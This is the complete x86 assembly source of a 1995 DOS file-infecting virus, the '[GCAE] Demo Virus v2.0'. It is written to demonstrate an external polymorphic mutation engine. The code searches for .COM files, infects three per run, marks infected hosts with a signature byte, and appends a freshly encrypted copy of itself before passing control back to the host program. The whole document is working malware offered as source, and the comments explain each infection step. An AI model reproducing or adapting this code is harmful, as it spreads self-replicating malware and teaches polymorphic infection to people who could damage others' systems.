
;       This is [GCAE] Demo Virus v2.0
;  Written by Golden Cicada in Taipei, Taiwan.
;      (C) Copyright CVEX Corp. , 1995.

        .286
        .model  small
        .code

        extrn   GCAE:near,GCAE_E:near   ;*** remember this line must be added ***

start:
        jmp short begin

wrt_dat db 0aeh,0e9h
jmp_addr dw ?
head_dat db 4h dup(?)                ;reserve the beginning 4 bytes of the infecting file
find_name db '*.COM',00h             ;only infect .COM files
dta_buf db 30h dup(?)                ;DTA information area

begin:
        call get_adr
get_adr:
        pop si                          ;get the SI value
        push cs                     ;*** NOTE!!! ***
        pop ds                      ;*** In the coding virus DS: must be set to the original value
        sub si,OFFSET get_adr
        mov di,si
        and di,0fff0h                   ;convert to a multiple of 16, easier to re-set the position
        mov ax,di
        mov cl,04h
        shr ax,cl
        mov cx,cs
        add ax,cx
        push ax
        mov ax,OFFSET retf_to
        push ax
        mov cx,OFFSET GCAE_E            ;cx:=(virus length+GCAE module)
        cld
        rep movsb
        retf                            ;re-set the position
retf_to:
        push cs
        pop ds
        mov si,OFFSET head_dat
        xor di,di
        cmp BYTE PTR head_dat,00h
        jz first
        mov di,0100h
        push di
        movsw                           ;restore the beginning of the original file...
        movsw                           ;
        pop di
first:
        push es                         ;temporary save the PSP Segment...
        push di
        push es
        mov ah,1ah
        mov dx,OFFSET dta_buf
        int 21h
        mov si,0003h                    ;infect 3 COM files each time
        mov ah,4eh
        mov cx,0003h
        mov dx,OFFSET find_name
        int 21h
        jnc to_infect
        jmp short find_end
find_loop:
        mov ah,4fh
        int 21h
        jc find_end
to_infect:
        call infect                     ;infecting file
        dec si
        jnz find_loop
find_end:
        pop es                          ;get back the PSP Segment...
        push es
        pop ds
        mov dx,80h
        mov ah,1ah
        int 21h
        retf                            ;run the original file...

infect  proc
        mov dx,OFFSET dta_buf+1eh
        mov ax,3d02h
        int 21h                         ;open file(READ/WRITE mode)
        xchg bx,ax
        mov ah,3fh
        mov cx,0004h
        mov dx,OFFSET head_dat
        int 21h                         ;read 4 bytes to head_dat
        inc si
        cmp BYTE PTR head_dat,0aeh
        je close_file
        dec si
        push si
        xor cx,cx
        xor dx,dx
        mov ax,4202h                    ;move the read/write pointer to the end of file
        int 21h
        push bx
        mov bx,ax
        add bx,0100h                    ;*** the format of COM file ***
        sub ax,0004h
        mov jmp_addr,ax
        mov ax,OFFSET GCAE_E+0fh
        mov cl,04h
        shr ax,cl
        mov cx,cs
        add ax,cx
        mov es,ax
        mov cx,OFFSET GCAE_E            ;*** the length of virus being coded ***
        mov dx,OFFSET start
        in ax,40h
        and ax,0001h
        mov bp,ax
        call GCAE                       ;*** call the mutation module ***
        pop bx
        mov ah,40h
        int 21h                         ;write file...
        push cs
        pop ds
        xor cx,cx
        xor dx,dx
        mov ax,4200h
        int 21h
        mov ah,40h
        mov cx,0004h
        mov dx,OFFSET wrt_dat
        int 21h
        pop si
close_file:
        mov ah,3eh                      ;close file...
        int 21h
        ret
infect  endp

        end start

